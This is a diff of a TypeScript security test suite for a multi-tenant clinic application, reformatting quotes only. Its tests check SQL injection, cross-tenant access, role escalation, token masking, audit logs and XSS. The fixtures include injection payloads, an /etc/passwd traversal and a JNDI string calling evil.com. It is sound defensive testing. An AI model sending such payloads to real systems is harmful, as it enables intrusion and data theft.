@@ -9,14 +9,14 @@
  * - Audit trail integrity
  */
 
-import { prisma } from "@/lib/database/client";
-import * as clinicQueries from "@/lib/database/queries/clinics";
-import * as googleSheetsQueries from "@/lib/database/queries/google-sheets";
-import * as userQueries from "@/lib/database/queries/users";
-import type { User } from "@prisma/client"; // Corrected User import path
-import { createClient } from "@supabase/supabase-js";
-import { v4 as uuidv4 } from "uuid";
-import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { prisma } from '@/lib/database/client';
+import * as clinicQueries from '@/lib/database/queries/clinics';
+import * as googleSheetsQueries from '@/lib/database/queries/google-sheets';
+import * as userQueries from '@/lib/database/queries/users';
+import type { User } from '@prisma/client'; // Corrected User import path
+import { createClient } from '@supabase/supabase-js';
+import { v4 as uuidv4 } from 'uuid';
+import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 
 // Test database connection
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
@@ -26,8 +26,8 @@ const serviceClient = createClient(supabaseUrl, supabaseServiceKey);
 // Test data for security tests
 const securityTestData = {
   clinics: [
-    { id: uuidv4(), name: "Secure Clinic A", location: "Secure City A" },
-    { id: uuidv4(), name: "Secure Clinic B", location: "Secure City B" },
+    { id: uuidv4(), name: 'Secure Clinic A', location: 'Secure City A' },
+    { id: uuidv4(), name: 'Secure Clinic B', location: 'Secure City B' },
   ],
   users: [] as User[], // Changed from unknown[] to User[]
   authIds: [] as string[],
@@ -35,14 +35,14 @@ const securityTestData = {
     "'; DROP TABLE users; --",
     "' OR '1'='1",
     "<script>alert('xss')</script>",
-    "../../etc/passwd",
-    "${jndi:ldap://evil.com/a}",
-    "{{7*7}}",
+    '../../etc/passwd',
+    '${jndi:ldap://evil.com/a}',
+    '{{7*7}}',
     "%{(#_='multipart/form-data')}",
   ],
 };
 
-describe("Security Tests", () => {
+describe('Security Tests', () => {
   beforeAll(async () => {
     // Create test clinics
     for (const clinic of securityTestData.clinics) {
@@ -51,19 +51,19 @@ describe("Security Tests", () => {
           id: clinic.id,
           name: clinic.name,
           location: clinic.location,
-          status: "active",
+          status: 'active',
         },
       });
     }
 
     // Create test users
-    const userRoles = ["clinic_admin", "provider", "staff", "viewer"];
+    const userRoles = ['clinic_admin', 'provider', 'staff', 'viewer'];
 
     for (let i = 0; i < 2; i++) {
       for (const role of userRoles) {
         const { data, error } = await serviceClient.auth.admin.createUser({
           email: `security.${role}${i}@testclinic.com`,
-          password: "SecurePass123!",
+          password: 'SecurePass123!',
           email_confirm: true,
           user_metadata: {
             name: `Security ${role} ${i}`,
@@ -116,14 +116,14 @@ describe("Security Tests", () => {
         where: { id: { in: securityTestData.clinics.map((c) => c.id) } },
       });
     } catch (error) {
-      console.error("Cleanup error:", error);
+      console.error('Cleanup error:', error);
     }
   });
 
-  describe("SQL Injection Prevention", () => {
-    it("should prevent SQL injection in user queries", async () => {
+  describe('SQL Injection Prevention', () => {
+    it('should prevent SQL injection in user queries', async () => {
       const adminUser = securityTestData.users.find(
-        (u) => u.role === "clinic_admin" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const authContext = {
@@ -131,7 +131,7 @@ describe("Security Tests", () => {
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Test various SQL injection attempts
@@ -165,9 +165,9 @@ describe("Security Tests", () => {
       expect(tableCheck).toHaveLength(3);
     });
 
-    it("should use parameterized queries for all database operations", async () => {
+    it('should use parameterized queries for all database operations', async () => {
       const adminUser = securityTestData.users.find(
-        (u) => u.role === "clinic_admin" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const authContext = {
@@ -175,16 +175,16 @@ describe("Security Tests", () => {
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Create user with potentially dangerous name
       const dangerousName = "Robert'); DROP TABLE students;--";
 
       const newUser = await userQueries.createUser(authContext, {
-        email: "bobby.tables@xkcd.com",
+        email: 'bobby.tables@xkcd.com',
         name: dangerousName,
-        role: "viewer",
+        role: 'viewer',
         clinicId: adminUser.clinicId,
       });
 
@@ -202,14 +202,14 @@ describe("Security Tests", () => {
     });
   });
 
-  describe("Cross-Tenant Access Prevention", () => {
-    it("should prevent direct ID access across tenants", async () => {
+  describe('Cross-Tenant Access Prevention', () => {
+    it('should prevent direct ID access across tenants', async () => {
       // Get users from different clinics
       const userClinicA = securityTestData.users.find(
-        (u) => u.role === "clinic_admin" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
       );
       const userClinicB = securityTestData.users.find(
-        (u) => u.role === "provider" && u.clinicId === securityTestData.clinics[1].id
+        (u) => u.role === 'provider' && u.clinicId === securityTestData.clinics[1].id
       );
 
       const authContextA = {
@@ -217,7 +217,7 @@ describe("Security Tests", () => {
         authId: userClinicA.authId,
         clinicIds: [userClinicA.clinicId],
         currentClinicId: userClinicA.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Try to access user from clinic B using clinic A's context
@@ -226,9 +226,9 @@ describe("Security Tests", () => {
       expect(unauthorizedUser).toBeNull();
     });
 
-    it("should prevent parameter manipulation attacks", async () => {
+    it('should prevent parameter manipulation attacks', async () => {
       const user = securityTestData.users.find(
-        (u) => u.role === "provider" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'provider' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const authContext = {
@@ -250,8 +250,8 @@ describe("Security Tests", () => {
       expect(clinics.clinics[0].id).toBe(user.clinicId);
     });
 
-    it("should validate UUID parameters", async () => {
-      const user = securityTestData.users.find((u) => u.role === "clinic_admin");
+    it('should validate UUID parameters', async () => {
+      const user = securityTestData.users.find((u) => u.role === 'clinic_admin');
 
       const authContext = {
         userId: user.id,
@@ -263,12 +263,12 @@ describe("Security Tests", () => {
 
       // Try to use non-UUID values
       const invalidIds = [
-        "not-a-uuid",
-        "123",
-        "",
+        'not-a-uuid',
+        '123',
+        '',
         null,
         undefined,
-        "../../etc/passwd",
+        '../../etc/passwd',
         "' OR '1'='1",
       ];
 
@@ -280,10 +280,10 @@ describe("Security Tests", () => {
     });
   });
 
-  describe("Permission Escalation Prevention", () => {
-    it("should prevent role elevation attacks", async () => {
+  describe('Permission Escalation Prevention', () => {
+    it('should prevent role elevation attacks', async () => {
       const viewerUser = securityTestData.users.find(
-        (u) => u.role === "viewer" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'viewer' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const viewerContext = {
@@ -291,15 +291,15 @@ describe("Security Tests", () => {
         authId: viewerUser.authId,
         clinicIds: [viewerUser.clinicId],
         currentClinicId: viewerUser.clinicId,
-        role: "viewer",
+        role: 'viewer',
       };
 
       // Try to create a user (admin-only operation)
       await expect(
         userQueries.createUser(viewerContext, {
-          email: "escalation@test.com",
-          name: "Escalation Test",
-          role: "clinic_admin", // Try to create admin
+          email: 'escalation@test.com',
+          name: 'Escalation Test',
+          role: 'clinic_admin', // Try to create admin
           clinicId: viewerUser.clinicId,
         })
       ).rejects.toThrow();
@@ -307,14 +307,14 @@ describe("Security Tests", () => {
       // Try to update own role
       await expect(
         userQueries.updateUser(viewerContext, viewerUser.id, {
-          role: "clinic_admin",
+          role: 'clinic_admin',
         })
       ).rejects.toThrow();
     });
 
-    it("should validate role hierarchy in operations", async () => {
+    it('should validate role hierarchy in operations', async () => {
       const staffUser = securityTestData.users.find(
-        (u) => u.role === "staff" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'staff' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const staffContext = {
@@ -322,19 +322,19 @@ describe("Security Tests", () => {
         authId: staffUser.authId,
         clinicIds: [staffUser.clinicId],
         currentClinicId: staffUser.clinicId,
-        role: "staff",
+        role: 'staff',
       };
 
       // Staff shouldn't be able to modify clinic settings
       await expect(
         clinicQueries.updateClinic(staffContext, staffUser.clinicId, {
-          name: "Hacked Clinic Name",
+          name: 'Hacked Clinic Name',
         })
-      ).rejects.toThrow("Only clinic administrators");
+      ).rejects.toThrow('Only clinic administrators');
     });
 
-    it("should prevent bypassing role checks via direct queries", async () => {
-      const viewerUser = securityTestData.users.find((u) => u.role === "viewer");
+    it('should prevent bypassing role checks via direct queries', async () => {
+      const viewerUser = securityTestData.users.find((u) => u.role === 'viewer');
 
       // Try to directly update role in database
       // This should be prevented by RLS policies
@@ -354,14 +354,14 @@ describe("Security Tests", () => {
         where: { userId: viewerUser.id },
       });
 
-      expect(role?.role).toBe("viewer");
+      expect(role?.role).toBe('viewer');
     });
   });
 
-  describe("Token Security", () => {
-    it("should not expose OAuth tokens in responses", async () => {
+  describe('Token Security', () => {
+    it('should not expose OAuth tokens in responses', async () => {
       const adminUser = securityTestData.users.find(
-        (u) => u.role === "clinic_admin" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const authContext = {
@@ -369,23 +369,23 @@ describe("Security Tests", () => {
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Create a data source with tokens
       const dataSource = await googleSheetsQueries.createDataSource(authContext, {
-        name: "Security Test Sheet",
-        spreadsheetId: "test-sheet-id",
-        sheetName: "Sheet1",
-        syncFrequency: "daily",
+        name: 'Security Test Sheet',
+        spreadsheetId: 'test-sheet-id',
+        sheetName: 'Sheet1',
+        syncFrequency: 'daily',
         clinicId: adminUser.clinicId,
-        accessToken: "secret-access-token",
-        refreshToken: "secret-refresh-token",
+        accessToken: 'secret-access-token',
+        refreshToken: 'secret-refresh-token',
       });
 
       // Tokens should be masked in response
-      expect(dataSource.accessToken).toBe("***");
-      expect(dataSource.refreshToken).toBe("***");
+      expect(dataSource.accessToken).toBe('***');
+      expect(dataSource.refreshToken).toBe('***');
 
       // Get data source without token access
       const retrievedSource = await googleSheetsQueries.getDataSourceById(
@@ -393,16 +393,16 @@ describe("Security Tests", () => {
         dataSource.id
       );
 
-      expect(retrievedSource?.accessToken).toBe("***");
-      expect(retrievedSource?.refreshToken).toBe("***");
+      expect(retrievedSource?.accessToken).toBe('***');
+      expect(retrievedSource?.refreshToken).toBe('***');
 
       // Cleanup
       await googleSheetsQueries.deleteDataSource(authContext, dataSource.id);
     });
 
-    it("should require admin role to access tokens", async () => {
+    it('should require admin role to access tokens', async () => {
       const adminUser = securityTestData.users.find(
-        (u) => u.role === "clinic_admin" && u.clinicId === securityTestData.clinics[0].id
+        (u) => u.role === 'clinic_admin' && u.clinicId === securityTestData.clinics[0].id
       );
 
       const adminContext = {
@@ -410,18 +410,18 @@ describe("Security Tests", () => {
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Create data source as admin
       const dataSource = await googleSheetsQueries.createDataSource(adminContext, {
-        name: "Token Test Sheet",
-        spreadsheetId: "token-test-id",
-        sheetName: "Sheet1",
-        syncFrequency: "daily",
+        name: 'Token Test Sheet',
+        spreadsheetId: 'token-test-id',
+        sheetName: 'Sheet1',
+        syncFrequency: 'daily',
         clinicId: adminUser.clinicId,
-        accessToken: "admin-access-token",
-        refreshToken: "admin-refresh-token",
+        accessToken: 'admin-access-token',
+        refreshToken: 'admin-refresh-token',
       });
 
       // Admin with includeToken option should see tokens
@@ -438,17 +438,17 @@ describe("Security Tests", () => {
     });
   });
 
-  describe("Audit Trail Integrity", () => {
-    it("should create tamper-proof audit logs", async () => {
+  describe('Audit Trail Integrity', () => {
+    it('should create tamper-proof audit logs', async () => {
       const testClinicId = uuidv4();
 
       // Create a clinic to trigger audit log
       await prisma.clinic.create({
         data: {
           id: testClinicId,
-          name: "Audit Security Test",
-          location: "Audit Location",
-          status: "active",
+          name: 'Audit Security Test',
+          location: 'Audit Location',
+          status: 'active',
         },
       });
 
@@ -462,7 +462,7 @@ describe("Security Tests", () => {
       `) as unknown[];
 
       expect(auditLog).toHaveLength(1);
-      expect(auditLog[0].action).toBe("INSERT");
+      expect(auditLog[0].action).toBe('INSERT');
 
       // Try to modify audit log (should fail)
       try {
@@ -481,29 +481,29 @@ describe("Security Tests", () => {
         SELECT * FROM audit_logs WHERE id = ${auditLog[0].id}
       `) as unknown[];
 
-      expect(verifyLog[0].action).toBe("INSERT");
+      expect(verifyLog[0].action).toBe('INSERT');
 
       // Cleanup
       await prisma.clinic.delete({ where: { id: testClinicId } });
     });
 
-    it("should log security violations", async () => {
-      const user = securityTestData.users.find((u) => u.role === "viewer");
+    it('should log security violations', async () => {
+      const user = securityTestData.users.find((u) => u.role === 'viewer');
 
       const viewerContext = {
         userId: user.id,
         authId: user.authId,
         clinicIds: [user.clinicId],
         currentClinicId: user.clinicId,
-        role: "viewer",
+        role: 'viewer',
       };
 
       // Attempt unauthorized operation
       try {
         await userQueries.createUser(viewerContext, {
-          email: "unauthorized@test.com",
-          name: "Unauthorized",
-          role: "admin",
+          email: 'unauthorized@test.com',
+          name: 'Unauthorized',
+          role: 'admin',
           clinicId: user.clinicId,
         });
       } catch (error) {
@@ -517,16 +517,16 @@ describe("Security Tests", () => {
     });
   });
 
-  describe("Input Validation & Sanitization", () => {
-    it("should validate and sanitize all inputs", async () => {
-      const adminUser = securityTestData.users.find((u) => u.role === "clinic_admin");
+  describe('Input Validation & Sanitization', () => {
+    it('should validate and sanitize all inputs', async () => {
+      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');
 
       const authContext = {
         userId: adminUser.id,
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Test XSS prevention in text fields
@@ -534,7 +534,7 @@ describe("Security Tests", () => {
         '<script>alert("xss")</script>',
         '<img src=x onerror=alert("xss")>',
         'javascript:alert("xss")',
-        "<iframe src=\"javascript:alert('xss')\">",
+        '<iframe src="javascript:alert(\'xss\')">',
       ];
 
       for (const xssPayload of xssTests) {
@@ -546,7 +546,7 @@ describe("Security Tests", () => {
             targetValue: 100,
             currentValue: 0,
             targetDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
-            status: "active",
+            status: 'active',
           },
         });
 
@@ -559,27 +559,27 @@ describe("Security Tests", () => {
       }
     });
 
-    it("should enforce data type constraints", async () => {
-      const adminUser = securityTestData.users.find((u) => u.role === "clinic_admin");
+    it('should enforce data type constraints', async () => {
+      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');
 
       const authContext = {
         userId: adminUser.id,
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Test invalid data types
       await expect(
         prisma.goal.create({
           data: {
-            name: "Type Test",
+            name: 'Type Test',
             clinicId: adminUser.clinicId,
-            targetValue: "not a number" as unknown, // Should be number
+            targetValue: 'not a number' as unknown, // Should be number
             currentValue: 0,
-            targetDate: "not a date" as unknown, // Should be date
-            status: "active",
+            targetDate: 'not a date' as unknown, // Should be date
+            status: 'active',
           },
         })
       ).rejects.toThrow();
@@ -598,16 +598,16 @@ describe("Security Tests", () => {
     });
   });
 
-  describe("Rate Limiting & DoS Prevention", () => {
-    it("should handle bulk operations without overwhelming the system", async () => {
-      const adminUser = securityTestData.users.find((u) => u.role === "clinic_admin");
+  describe('Rate Limiting & DoS Prevention', () => {
+    it('should handle bulk operations without overwhelming the system', async () => {
+      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');
 
       const authContext = {
         userId: adminUser.id,
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Attempt rapid successive queries
@@ -623,21 +623,21 @@ describe("Security Tests", () => {
 
       // All should complete without crashing
       const results = await Promise.allSettled(promises);
-      const successful = results.filter((r) => r.status === "fulfilled");
+      const successful = results.filter((r) => r.status === 'fulfilled');
 
       expect(successful.length).toBeGreaterThan(0);
       console.log(`Bulk query success rate: ${successful.length}/50`);
     });
 
-    it("should limit result set sizes", async () => {
-      const adminUser = securityTestData.users.find((u) => u.role === "clinic_admin");
+    it('should limit result set sizes', async () => {
+      const adminUser = securityTestData.users.find((u) => u.role === 'clinic_admin');
 
       const authContext = {
         userId: adminUser.id,
         authId: adminUser.authId,
         clinicIds: [adminUser.clinicId],
         currentClinicId: adminUser.clinicId,
-        role: "clinic_admin",
+        role: 'clinic_admin',
       };
 
       // Try to request excessive limit
